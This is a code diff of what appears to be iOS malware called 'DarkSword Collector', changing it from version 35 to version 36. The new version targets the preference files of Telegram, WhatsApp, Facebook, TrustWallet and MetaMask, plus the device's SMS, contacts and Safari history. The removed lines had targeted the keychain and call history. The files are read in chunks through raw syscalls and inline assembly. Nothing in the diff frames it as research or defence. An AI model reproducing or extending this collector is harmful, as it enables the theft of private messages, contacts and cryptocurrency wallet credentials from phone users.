@@ -1,8 +1,7 @@
 /**
- * DarkSword Collector v35 - Credential-focused: Keychain + App containers
- * Phase 1: Read keychain DB first bytes
- * Phase 2: List /var/mobile/Containers/Data/Application/ entries
- * Uses getdirentries syscall for directory listing
+ * DarkSword Collector v36 - App credential scan
+ * Reads preference plists for target apps + directory listing
+ * Files: Telegram, WhatsApp, Facebook, TrustWallet, MetaMask plists + app container dir
  */
 
 static long _svc1(long n, long a) {
@@ -31,33 +30,25 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define O_RDONLY 0
 
 #define NUM_FILES 8
-#define CHUNKS_PER_FILE 5
+#define CHUNKS_PER_FILE 8
 
 static volatile int g_ctx = 0;
 
 static const char *get_path(int id) {
     switch (id) {
-        case 0: return "/etc/hosts";
-        case 1: return "/var/keychains/keychain-2.db";
-        case 2: return "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
-        case 3: return "/var/mobile/Library/Safari/History.db";
-        case 4: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
-        case 5: return "/var/mobile/Library/SMS/sms.db";
-        case 6: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
-        case 7: return "/var/mobile/Library/Preferences/com.apple.springboard.plist";
+        /* Target app preference plists */
+        case 0: return "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist";
+        case 1: return "/var/mobile/Library/Preferences/net.whatsapp.WhatsApp.plist";
+        case 2: return "/var/mobile/Library/Preferences/com.facebook.Facebook.plist";
+        case 3: return "/var/mobile/Library/Preferences/com.sixdays.trustwallet.plist";
+        case 4: return "/var/mobile/Library/Preferences/io.metamask.MetaMask.plist";
+        /* System credential stores */
+        case 5: return "/var/mobile/Library/Safari/History.db";
+        case 6: return "/var/mobile/Library/SMS/sms.db";
+        case 7: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
         default: return (void*)0;
     }
 }
-
-/* Directory entry structure for getdirentries */
-struct dirent_darwin {
-    unsigned long long d_ino;
-    unsigned long long d_seekoff;
-    unsigned short d_reclen;
-    unsigned short d_namlen;
-    unsigned char d_type;
-    char d_name[1024];
-};
 
 int ds_start(void) {
     int ctx;
@@ -69,7 +60,6 @@ int ds_start(void) {
         __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
         return 0xFFFFFFFF;
     }
-
     if (chk >= CHUNKS_PER_FILE) {
         int nc = ((fid + 1) << 16);
         __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
